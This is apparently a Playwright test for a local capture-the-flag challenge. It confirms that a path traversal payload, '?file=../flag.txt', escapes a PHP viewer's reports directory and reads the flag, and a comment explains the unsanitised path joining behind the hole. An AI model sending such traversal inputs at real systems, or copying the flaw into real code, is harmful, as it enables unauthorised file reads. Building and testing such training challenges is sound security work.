import { test, expect } from '@playwright/test'

const BASE_URL = 'http://localhost:5173/challenge/confidential-files/'
const FLAG_REGEX = /(FLAG|CTF)\{[^}]+\}/
// Path traversal — the ?file= viewer concatenates input onto the /reports
// base directory with no canonicalisation, so `../flag.txt` escapes the
// directory and reads /flag.txt. The `../` lives in the query string, so the
// URL parser leaves it intact for the PHP runtime to resolve on the VFS.

test('confidential-files is solvable via ?file=../flag.txt', async ({ page }) => {
  await page.goto(BASE_URL)
  await page.waitForFunction(
    () =>
      navigator.serviceWorker.controller !== null &&
      typeof (globalThis as { __wxlDispatch?: unknown }).__wxlDispatch === 'function',
    null,
    { timeout: 120_000 },
  )

  const flagBody = await page.evaluate(async () => {
    const dispatch = (globalThis as unknown as {
      __wxlDispatch?: (req: Request) => Promise<Response>
    }).__wxlDispatch
    if (!dispatch) {
      throw new Error('__wxlDispatch not exposed on the page')
    }
    const base = 'https://challenge-confidential-files.localhost'
    const req = new Request(`${base}/?file=../flag.txt`, { method: 'GET' })
    const r = await dispatch(req)
    return await r.text()
  })

  expect(flagBody).toMatch(FLAG_REGEX)
})
